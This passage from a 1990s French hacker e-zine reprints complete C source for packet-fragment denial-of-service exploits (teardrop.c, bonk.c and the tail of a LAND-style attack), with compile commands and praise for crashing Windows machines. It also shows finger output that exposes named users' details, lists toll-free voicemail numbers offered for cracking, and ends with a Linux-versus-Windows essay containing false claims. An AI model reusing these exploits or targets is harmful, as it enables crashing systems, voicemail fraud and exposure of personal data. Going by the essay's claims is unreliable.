                fprintf(stderr,"usage: %s IP port\n",argv[0]);
                return(-1);
        }

        bzero(&sin,sizeof(struct sockaddr_in));
        sin.sin_family=AF_INET;

        if((hoste=gethostbyname(argv[1]))!=NULL)
                bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
        else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)
        {
                fprintf(stderr,"unknown host %s\n",argv[1]);
                return(-1);
        }

        if((sin.sin_port=htons(atoi(argv[2])))==0)
        {
                fprintf(stderr,"unknown port %s\n",argv[2]);
                return(-1);
        }

        if((sock=socket(AF_INET,SOCK_RAW,255))==-1)
        {
                fprintf(stderr,"couldn't allocate raw socket\n");
                return(-1);
        }

        bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));
        ipheader->version=4;
        ipheader->ihl=sizeof(struct iphdr)/4;
        ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
        ipheader->id=htons(0xF1C);
        ipheader->ttl=255;
        ipheader->protocol=IP_TCP;
        ipheader->saddr=sin.sin_addr.s_addr;
        ipheader->daddr=sin.sin_addr.s_addr;

        tcpheader->th_sport=sin.sin_port;
        tcpheader->th_dport=sin.sin_port;
        tcpheader->th_seq=htonl(0xF1C);
        tcpheader->th_flags=TH_SYN;
        tcpheader->th_off=sizeof(struct tcphdr)/4;
        tcpheader->th_win=htons(2048);

        bzero(&pseudoheader,12+sizeof(struct tcphdr));
        pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
        pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
        pseudoheader.protocol=6;
        pseudoheader.length=htons(sizeof(struct tcphdr));
        bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
        tcpheader->th_sum=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));

        if(sendto(sock,buffer,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
        {
                fprintf(stderr,"couldn't send packet\n");
                return(-1);
        }

        fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);

        close(sock);
        return(0);
}
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


______________________________________________________________________________________
Analyse du Script     : TearDrop.c 11.3.97
Auteur                : route|deamon9
URL de TΘlΘchargement : http://www.technotronic.com
Note sur 10           : 8/10
Note(s) du programme  : heehe sans probleme pour la compilation !!
                        gcc -o2 teadrop.c -o teadrop
Fonction(s)           : Peut fuckΘ n'importe quel machine 
                        Windows 3.1 - Windows 95 - Windows 98
                        Sauf si le PC est patchΘ contre le teardrop
Commantaire(s)        : Voir Bonk.c plus loin :)        

Voici le code : 
»»»»»»»»»»»»» »
/*
 *  Copyright (c) 1997 route|daemon9  &lt;route@infonexus.com> 11.3.97
 *
 *  Linux/NT/95 Overlap frag bug exploit
 *
 *  Exploits the overlapping IP fragment bug present in all Linux kernels and
 *  NT 4.0 / Windows 95 (others?)
 *
 *  Based off of:   flip.c by klepto
 *  Compiles on:    Linux, *BSD*
 *
 *  gcc -O2 teardrop.c -o teardrop
 *      OR
 *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING
 */

#include &lt;stdio.h>
#include &lt;stdlib.h>
#include &lt;unistd.h>
#include &lt;string.h>
#include &lt;netdb.h>
#include &lt;netinet/in.h>
#include &lt;netinet/udp.h>
#include &lt;arpa/inet.h>
#include &lt;sys/types.h>
#include &lt;sys/time.h>
#include &lt;sys/socket.h>

#ifdef STRANGE_BSD_BYTE_ORDERING_THING
                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
#define FIX(n)  (n)
#else                   /* OpenBSD 2.1, all Linux */
#define FIX(n)  htons(n)
#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */

#define IP_MF   0x2000  /* More IP fragment en route */
#define IPH     0x14    /* IP header size */
#define UDPH    0x8     /* UDP header size */
#define PADDING 0x1c    /* datagram frame padding for first packet */
#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */
#define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can
                         * withstand maybe 5 or 10 sometimes...  Experiment.
                         */
void usage(u_char *);
u_long name_resolve(u_char *);
u_short in_cksum(u_short *, int);
void send_frags(int, u_long, u_long, u_short, u_short);

int main(int argc, char **argv)
{
    int one = 1, count = 0, i, rip_sock;
    u_long  src_ip = 0, dst_ip = 0;
    u_short src_prt = 0, dst_prt = 0;
    struct in_addr addr;

    fprintf(stderr, "teardrop   route|daemon9\n\n");

    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("raw socket");
        exit(1);
    }
    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
        < 0)
    {
        perror("IP_HDRINCL");
        exit(1);
    }
    if (argc < 3) usage(argv[0]);
    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
    {
        fprintf(stderr, "What the hell kind of IP address is that?\n");
        exit(1);
    }

    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
    {
        switch (i)
        {
            case 's':               /* source port (should be emphemeral) */
                src_prt = (u_short)atoi(optarg);
                break;
            case 't':               /* dest port (DNS, anyone?) */
                dst_prt = (u_short)atoi(optarg);
                break;
            case 'n':               /* number to send */
                count   = atoi(optarg);
                break;
            default :
                usage(argv[0]);
                break;              /* NOTREACHED */
        }
    }
    srandom((unsigned)(time((time_t)0)));
    if (!src_prt) src_prt = (random() % 0xffff);
    if (!dst_prt) dst_prt = (random() % 0xffff);
    if (!count)   count   = COUNT;

    fprintf(stderr, "Death on flaxen wings:\n");
    addr.s_addr = src_ip;
    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
    addr.s_addr = dst_ip;
    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
    fprintf(stderr, " Amt: %5d\n", count);
    fprintf(stderr, "[ ");

    for (i = 0; i < count; i++)
    {
        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
        fprintf(stderr, "b00m ");
        usleep(500);
    }
    fprintf(stderr, "]\n");
    return (0);
}

/*
 *  Send two IP fragments with pathological offsets.  We use an implementation
 *  independent way of assembling network packets that does not rely on any of
 *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
 */

void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                u_short dst_prt)
{
    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
    u_char byte;                            /* a byte */
    struct sockaddr_in sin;                 /* socket protocol structure */

    sin.sin_family      = AF_INET;
    sin.sin_port        = src_prt;
    sin.sin_addr.s_addr = dst_ip;

    /*
     * Grab some memory for our packet, align p_ptr to point at the beginning
     * of our packet, and then fill it with zeros.
     */
    packet = (u_char *)malloc(IPH + UDPH + PADDING);
    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

    byte = 0x45;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */

    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }

    /*  We set the fragment offset to be inside of the previous packet's
     *  payload (it overlaps inside the previous packet) but do not include
     *  enough payload to cover complete the datagram.  Just the header will
     *  do, but to crash NT/95 machines, a bit larger of packet seems to work
     *  better.
     */
    p_ptr = &packet[2];         /* IP total length is 2 bytes into the header */
    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);
    p_ptr += 4;                 /* IP offset is 6 bytes into the header */
    *((u_short *)p_ptr) = FIX(MAGIC);

    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}

u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

void usage(u_char *name)
{
    fprintf(stderr,
            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",
            name);
    exit(0);
}

/* EOF */
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


___________________________________________________________________________
Analyse du Script     : Bonk.c 
Auteur                : route|deamon9 & klepto
URL de TΘlΘchargement : http://www.technotronic.com
Note sur 10           : 7/10
Note(s) du programme  : Je n'ai pas ΘtΘ capable de le compiller
Fonction(s)           : Crash le patch contre le teadrop
                        Windows 3.1 - Windows 95 - Windows 98
Commantaire(s)        : Si vous trouvez ce qu'il ne marche pas avec le
                        compillateur, dites-le moi svp.

Voici le code : 
»»»»»»»»»»»»» »
/*

  [ http://www.technotronic.com.com/ ]

                                ==bendi - 1998==

                        bonk.c        -         5/01/1998
        Based On: teardrop.c by route|daemon9 & klepto
        Crashes *patched* win95/(NT?) machines.

        Basically, we set the frag offset > header length (teardrop
        reversed). There are many theories as to why this works,
        however i do not have the resources to perform extensive testing.
        I make no warranties. Use this code at your own risk.
        Rip it if you like, i've had my fun.

*/

#include &lt;stdio.h>
#include &lt;string.h>

#include &lt;netdb.h>
#include &lt;sys/socket.h>
#include &lt;sys/types.h>
#include &lt;netinet/in.h>
#include &lt;netinet/ip.h>
#include &lt;netinet/ip_udp.h>
#include &lt;netinet/protocols.h>
#include &lt;arpa/inet.h>

#define FRG_CONST       0x3
#define PADDING         0x1c

struct udp_pkt
{
        struct iphdr    ip;
        struct udphdr   udp;
        char data[PADDING];
} pkt;

int     udplen=sizeof(struct udphdr),
        iplen=sizeof(struct iphdr),
        datalen=100,
        psize=sizeof(struct udphdr)+sizeof(struct iphdr)+PADDING,
        spf_sck;                        /* Socket */

void usage(void)
{
        fprintf(stderr, "Usage: ./bonk &lt;src_addr> &lt;dst_addr> [num]\n");
        exit(0);
}

u_long host_to_ip(char *host_name)
{
        static  u_long ip_bytes;
        struct hostent *res;

        res = gethostbyname(host_name);
        if (res == NULL)
                return (0);
        memcpy(&ip_bytes, res->h_addr, res->h_length);
        return (ip_bytes);
}

void quit(char *reason)
{
        perror(reason);
        close(spf_sck);
        exit(-1);
}

int fondle(int sck, u_long src_addr, u_long dst_addr, int src_prt,
           int dst_prt)
{
        int     bs;
        struct  sockaddr_in to;

        memset(&pkt, 0, psize);
                                                /* Fill in ip header */
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(udplen + iplen + PADDING);
        pkt.ip.id = htons(0x455);
        pkt.ip.ttl = 255;
        pkt.ip.protocol = IP_UDP;
        pkt.ip.saddr = src_addr;
        pkt.ip.daddr = dst_addr;
        pkt.ip.frag_off = htons(0x2000);        /* more to come */

        pkt.udp.source = htons(src_prt);        /* udp header */
        pkt.udp.dest = htons(dst_prt);
        pkt.udp.len = htons(8 + PADDING);
                                                /* send 1st frag */

        to.sin_family = AF_INET;
        to.sin_port = src_prt;
        to.sin_addr.s_addr = dst_addr;

        bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
                sizeof(struct sockaddr));

        pkt.ip.frag_off = htons(FRG_CONST + 1);         /* shinanigan */
        pkt.ip.tot_len = htons(iplen + FRG_CONST);
                                                        /* 2nd frag */

        bs = sendto(sck, &pkt, iplen + FRG_CONST + 1, 0,
                (struct sockaddr *) &to, sizeof(struct sockaddr));

        return bs;
}

void main(int argc, char *argv[])
{
        u_long  src_addr,
                dst_addr;

        int     i,
                src_prt=53,
                dst_prt=53,
                bs = 1,
                pkt_count = 10;         /* Default amount */

        if (argc < 3)
                usage();

        if (argc == 4)
                pkt_count = atoi(argv[3]);      /* 10 does the trick */

        /* Resolve hostnames */

        src_addr = host_to_ip(argv[1]);
        if (!src_addr)
                quit("bad source host");
        dst_addr = host_to_ip(argv[2]);
        if (!dst_addr)
                quit("bad target host");

        spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (!spf_sck)
                quit("socket()");
        if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,
        sizeof(bs)) < 0)
                quit("IP_HDRINCL");

        for (i = 0; i < pkt_count; ++i)
        {
                fondle(spf_sck, src_addr, dst_addr, src_prt, dst_prt);
                usleep(10000);
        }

        printf("Done.\n");
}
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Conclusion : Donc, voilα pour ce zine. Continuer α le lire et souvenez-vous qu'α
             chaque ezine que Pyro-Phreak mag va sortir, il va y avoir une section
             comme cella qui va vous faire part des bons programmes qu'il existe.

   					    




____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                              Finger                   
'.________  __ __ ___________ ____ ______________ ____Par [G]r4FX__ __

Le programme finger permet d'obtenir des informations sur une personne. Le 
problΦme de ce programme c'est qui peut Ωtre utilisΘ pour dΘcouvrir
des nom de login sur un ordinateur : 

finger @193.51.222.81
[msb31u01.u-3mrs.fr]

Welcome to Linux version 2.0.29 at msb31u01.u-3mrs.fr !

 11:34am  up 6 days, 17:28,  4 users,  load average: 0.29, 0.33, 0.29

Login    Name                 Tty  Idle  Login Time   Office     Office Phone
jeannejy Jeannette Jean Yves   p1     3  Mar 25 11:30 (:0.0)
paperap  Papera Pierre         p3        Mar 25 11:34 (MSB31U04.U-3MRS.)
poggij   Poggi Jerome          1         Mar 25 11:33
root     Supper User           2         Mar 25 11:33



Cette commande affiche le nom des personnes qui sont connectΘes sur l'ordinateur 
193.51.222.81, de plus il indique des informations tel que : le
temps d'inactivitΘ, l'heure de login ... 

Tandis que la commande : 

finger poggij@msb31u01.u-3mrs.fr
[msb31u01.u-3mrs.fr]

Welcome to Linux version 2.0.29 at msb31u01.u-3mrs.fr !

 11:34am  up 6 days, 17:28,  4 users,  load average: 0.29, 0.33, 0.29

Login: poggij                           Name: Poggi Jerome
Directory: /home/duii2/poggij         Shell: /bin/bash
On since Tue Mar 25 11:33 (MET DST) on tty1   29 seconds idle
Mail last read Tue Mar 25 11:33 1997 (MET DST)
Plan:
                  \\_//
                  (, ,)
|-------------oOOo-(_)-oOOo---------------------------|
 Diplome Universitaire d'Ingenierie Informatique
 Faculte des Sciences et Technique d'Aix-Marseille III
 Avenue Escadrille Normandie Niemen
 13397 MARSEILLE Cedex 20
|-----------------------------------------------------|
 Home page:    http://msb31u01.u-3mrs.fr/~poggij
 E-Mail:       mailto:jerome.poggi@usa.net
|-----------------------------------------------------|



affiche des informations sur la personne tel que : 

     derniΦre heure de connexion 
     nom rΘel 
     directory de travail 
     ... 

Cette commande est trΦs utilisΘ pour dΘcouvrir des informations sur les comptes 
des utilisteurs. Elle peut Ωtre remplacΘ par une commande safe_finger fournis 
dans le pack tcp_wrapper, qui elle ne donne que trΦs peu d'informations. 

____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                     Encore les VMBs
'.________  __ __ ___________ ____ ______________ ____Par Neuro__ __

Voici le menu d'une VMB typique du Quebec et meme de France! Pour acceder
a ce menu, faut bien entendu avoir rΘussi a cracker le password!
En passant, cΘ pas un rip de NPC. J'ai prit ma petite enregistreuse pour 
prendre ca en note. Voici le menu en question:

Numero de tel   boite vocale
81 boite vocal#pass#

       2-╔coute
       4-Message PrΘcΘdant
       6-Message suivant 
       7*------0-Modaliter d'envois
              1-RΘponse
              2-Choisis de l'envelloppe
     	      3-RΘacheminement
              4-RΘponse diffusΘe
              5-CrΘation d'un message
              6-effacement
              9-envoie
              #-Quitter ce mode

       8*-----0-Modaliter de la boite vocale
                       1-Modifier le numero d'assistance direct
                       #-Quitter ce mode
              1-Acces
              2-Message d'accueil
                       1-Message d'accueil destiner au message externe
                       2-Message d'accueil destiner au message interne
                       *-Ecouter la liste de nouveau
                       #-Quitter ce mode
              3-Sortit
              4-Mot de passe
              5-Liste de diffusion
              6-Positionnement Direct
              9-Identification personnalisΘe
                       4-Pour quitter
                       5-Pour enregistrer le nom dans le message personnalisΘ
              #-Quitter ce mode
       9-Rapel de l'expΘditeur
      71-RΘponse
      73-RΘacheminement
      74-RΘponse diffusΘe
      76-Effacement
       *-Plus de renseignements

A chaque zine, j'ai dΘcider de vous donner quelques VMBs a hacker, question
de mettre la thΘorie en Pratique,dΘsoler pour les Francais.

1-800-468-9510 
1-800-468-9513  
1-800-468-9515 
1-800-468-1498 
1-800-468-5270          (Scan by Psykaos)
1-800-468-5290 
1-800-468-6320 
1-800-468-6321 
1-800-468-6322 
1-800-468-6324  

 

____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                            Linux vs Windows                  
'.________  __ __ ___________ ____ ______________ ____Par endrix__ __






                       O=======================O
                      <|I n t r o d u c t i o n|>
                       O=======================O



  Bon, pourquoi j'ai Θcrit cet article ?? Hey bien parce que il y a 
tellement de personne qui viennent me voir sur irc pour me demander des 
questions comme celle qui suivent : 

"C'est quoi la diffΘrence entre Windows et Linux ???"
"Pourquoi tant de personne ont adoptΘ le OS linux ???"
"Pourquoi que les logiciels de linux sont moins cher ???"
et bien d'autres ....

 Donc dans ce texte, je vais vous dire les diffΘrences entre Windows, qui
a ΘtΘ crΘe par Bill Gates et sont Θquipe et Linux qui a ΘtΘ crΘe au dΘbut
par un jeune pirate informatique du nom de Linus B. Torvalds, les
avantages, les dΘsavantages.... 

 Alors, s'il y a encore une personne sur internet qui vient me voir pour me
demander ca, je vais lui dire tout simplement d'aller voir cet e-zine.




                                 O=========O
                                <|L i n u x|>
                                 O=========O


Histoire :
»»»»»»»»»»
 Donc, comme j'ai dit dans l'introduction, Linux a ΘtΘ concu au dΘbut par un
jeune pirate informatique de l'UniversitΘ d'Helsinki, en finlande, Linus B. Torvalds 
qui avait 21 ans, en 1991. Il dΘcide de construire sont systΦme d'exploitation(OS)
parce que sont budjet d'Θtudiant ne lui permettait pas de pouvoir s'acheter les
logiciels sur le marchΘ et qui Θtaient a l'Θpoque, pas trΦs fiable. Donc, en 3
mois, Linus Θcrit environs 10 000 lignes de code de programme et soumet sont 
travail a une dixaines de correspondants sur l'internet. Donc au fur et a mesure
que sont projet avancait, de plus en plus d'internaute-programmeur ont rejoint
l'Θquipe, d'environs 150, qui en 1992 ont sorti le premiΦre version du systΦme
d'exploitation qui se nomma Linux.

 AprΦs la sorti de cette verion, Linus recoit des quatres coins de la planΦte des
sources, des programmes, des suggestions, des commantaires, des contributions pour
amiliorΘ Linux. AprΘs cela, linux ce transmet de main en main, d'internaute α
internaute, maintenant des centaines de milliers de personnes ont adoptΘ ce systΦme
d'exploitation et le OS va connaεtre ca gloire et servira mΩme a faire les trucages
dans le film Titanic. 
             »»»»»»»
 └ qui faut devoir le succΦss de Linux ??? Hey bien c'est a tout les utilisateurs du 
programme maintenant. Pour un teste, allez sur le cannal #hack.fr ou #phreak.fr et 
demandez conbien de personne on Linux ou encore combien de personne sont en linux 
prΘsentement. Vous allez voir que l'utilisateur de linux est trΦs nombreux.
Je peux dire que presque tout le monde dans ca vie qui a adoptΘ linux a passΘ
par Windows. Linux est un systΦme d'exploitation pour l'utilisateur plus avancΘ
du Pc.


Mais quel est le vrai avantage de Linux ??? 
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
 D'aprΦs moi, le vrai avantage de linux c'est que les sources des programmes sont α la 
portΘ de la main. Tout les programmes pour linux viennent avec la source. Donc, 
comparativement α Windows, tu n'as pas besoin d'aller suivre un cours de programmation
ou dΘpensser 60$ pour un livre de programmation. Juste avec les sources, vous pouvez trΦs
bien apprendre. On apprend avec les exemples et les sources sont les exemples. Donc, finnit
les virus ou les trojans. Avant de compiller un programme en linux vous pouvez aller voir
s'il peut faire des daumages a votre systeme et s'il en fait, flushhhh !!!! ou vous pouvez
le modifier afin qu'il n'en fasse plus. En windows, pour savoir ce que fait un .exe dΘjα 
compiller et que 0.00000001% du temps la source vient avec le programme vous pouvez l'editer
mais pour cela il faudra un editeur exadΘcimal et il vous faudra une bonne comprΘension du 
language de programmation, l'assembleur. 


Interface graphique ou en texte mode ???
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
heehe, cet question je l'ai entendu trΦs souvent. Linux vient en plusieur version et en voici
quelques une :

- Red Hat
- Debian
- Slackware

 Ces versions sont les plus connues. Linux viens avec une interface graphique et en text mode.
Umpeu comme Windows et DOS. La diffΘrence c'est que windows veut illiminer le Texte mode et que
tout soit user friendly mais linux lui garde le texte mode parce que vous ferez le test, le texte
mode est beaucoup plus rapide. Mais je peux dire que l'interface graphique de Linux est loin du 
GuI de windows. il y a plusieur facon de mettre un interface graphique en linux. Il y a litestep,
windows maker, x-windows ... Moi personnellement j'aime bien X-Windows :)


Stable ou instable ????
»»»»»»»»»»»»»»»»»»»»»»»

 Ce qui fait la force de linux est que les sources sont ouvert au public mais aussi c'est 
que linux est le systΦme d'exploitation le plus stable qu'il y a jusqu'α maintenant. C'est 
pourquoi que l'armΘe amΘricaine et l'armΘe francaise utilise le OS linux. La moitiΘ des 
serveurs sur l'internet sont en linux et l'autre moitiΘ sont en Windows NT et quelques un 
en Window 95/3.1 ... Naon, en Linux il n'y a pas de BLUE SCREEN !!!!!!


Compatible ou pas ???
»»»»»»»»»»»»»»»»»»»»»

 Ceci est le gros problΦme de linux et mΦme Apple ; la compatibilitΘ. Maintenant il y a 
beaucoup de programme fait en linux, comme Corel WordPerfect main maintenant des versions 
en linux mais ca n'arrive pas a la cheville des programmes qui sont fait pour Windows. 
N'espΘrΘ pas pouvoir jouer α un jeux super en linux. Mais les progammes qui sont les plus 
utilisΘs sur l'internet ont ΘtΘ fait n linux comme : Netscape, ICQ, WinAMp, Corel 
Wordperfect... Et si vous aimez faire de l'infographie, vous aimerez le programme Gimp 
qui je crois a une lΘgΦre avance sur Photoshop. 


Rapide ou pas ???
»»»»»»»»»»»»»»»»»
 Hey bien, Linux est beaucoup en texte mode alors il est beaucoup plus rapide mais il y 
a aussi un avantage α windows. Il utilise beaucoup moins de RAM. Linux utilise un systeme 
de swap memory qui est sur votre disque dur. De cette maniΦre, la vitesse a ΘtΘ aumentΘ 
de beaucoup.


Facile pour utilisation ???
»»»»»»»»»»»»»»»»»»»»»»»»»»»
HeY bien, je trouve pas. Pour le monde qui sont abituΘ en linux ils aiment ca mais moi...
j'aime umpeu plus la maniΦre de windows.

Windows [-=-]  Piton Install
Linux   [-=-]  Compillation, librairie.... pffff....




                                O=============O
                               <|W i n d o w s|>
                                O=============O


Histoire :
»»»»»»»»»»
Micro$oft, qui a ΘtΘ premiΦrement partie par Bill Gates(yerkk) qui a commencΘ ca compagnie
α l'Γge de 14 ans. il a commencΘ α vendre ces programmes α 14... WAW !!! euhhhh.... C'est
tout ce que j'ai pu trouvΘ sur Bill Gates et Microsoft.... Mais je peux dire que Windows
maintenant a tellement de pouvoir, que Bill Gates commence a s'enfler la tΩte avec ca.
Windows, maintenant, est plus utilisΘ comme un outil de domination que d'autre chose. Il
est fais de maniΦre trΦs vite et plein de bug. Teadrop, Nuke, OOB nuke.... Tout ca sont
des "bugs" que Microsoft on pas pensΘ parce qu'il Θtait trop pressΘ α sortir le systΦme
d'exploitation.



Quel est le vrai avantage de Window sur linux :
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
Le vrai avantage de Windows sur Linux est ca compatibilitΘ, ca facilitΘ d'utilisation et 
sont supposΘ Plug-and-play. Ben, moi j'appele plus ca plus-and-pray ... heheehhe :) Parce 
que souvent, le plus-and-play crash.... CA veut dire, entrez votre matΘriel sans avoir a 
le configurΘ et il va marcher tout seul..... yeah right... en tk... Il faut avouer que 
c'est windows qui a partit le monde de l'informatique. Sans microsoft, nous serions encore 
α l'Γge ed pierre avec des interfaces en texte ou tout le monde serait en Mac. Parce que 
en passsant, c'est Mac qui a premiΦrement pensΘ au bouton dΘmarrer. Presque tout ce qu'on
trouve sur le web, est compatible avec Microsoft Windows. Il a ΘtΘ plus concu pour les 
dΘbutants alors si vous Ωtes un utilisateur avancΘ du Pc, windows risque de vous frustrez 
plus que d'autre chose.


Interface graphique ou en texte mode ???
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
L'interface graphique de windows est trΦs bien. Tout ce fait sans avoir a aller en dos. 
Mais, elle contient plusieurs mais plusieurs bugs.... Mais, il y a quelques fonctions que 
j'aime bien qui sont en DOS comme le nbtstat, net use, net view, tracert..... Parfois, le
dos peux trΦs bien servir comme pour faire ca dir/s/w > dir.txt c'est dur α faire en 
windows ...


Stable ou instable ????
»»»»»»»»»»»»»»»»»»»»»»»
hehehehhehehe BLUE SCREEEEEEEEEEEEEEEEEEEEEEEEEEEEEENNNN !!!!!! AHHHHHHhhhhhh !!!!! explorer.exe
plante touttttttt le temps... Vive les blues screens... :) Windows est une machine a plantΘ
mais si vous le connaissez bien, vous trouverez ce qu'il le fait plantΘ et vous allez faire 
pour qu'il ne vous plante pu dans la face. Windows est le systΦme d'exploitation le plus 
instable qu'il y a jusqu'α maintenant.


Rapide ou pas ???
»»»»»»»»»»»»»»»»»
Windows, d'aprΦs moi, gobe beaucoup trop de mΘmoire ram. Comparativement α linux, il n'utilise
pas de mΘmoire swap(sur le hd) alors il ne fait qu'utiliser le RAM. Juste pour vous dire, 
windows 2000 a besoin de 64meg de RAM. Mais, linux est beaucoup rapide


____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                            Conclusion                    
'.________  __ __ ___________ ____ ______________ ____Par Neuro__ __

bon cΘ dΘja la fin du #2 de pyrofreakmag . J'espere que vous avez aimer, tk.
Si vous dΘsirer faire publier votre article dans le #3, envoyez le a
pyrofreakmag@hotmail.com , ou via IRC (#phreak.fr UNDERNET)
Site web:http://pyrofreak.cjb.net . Envoyer nous vos questions par e-mail, 
on va faire notre possible pour y rΘpondre dans un FAQ qu'on va faire dans 
le #3. Le #3 est fixer pour environ le 1er avril. Pour commentaires
ou suggestions : pyrofreakmag@hotmail.com 
J'aimerais remercier:
Toute l'Θquipe de pyrofreak
Maniak d'avoir changer d'avis, j'espere qui rechangera pas a nouveau.
Darkbug, de distribuer notre zine sur son site web.
Nos supporteurs sur #phreak.fr via Undernet
Tient Nuclear une petite pub pour ton server 
/server shell.optima-dialup.com 6667   #mtl.server   (krusnet) vener nous 
voir.

@@@@@@@@@@@@@@@@@@@@Pyrofreakmag touts droits rΘservΘs@@@@@@@@@@@@@@@@@@@@@@

```

</div>
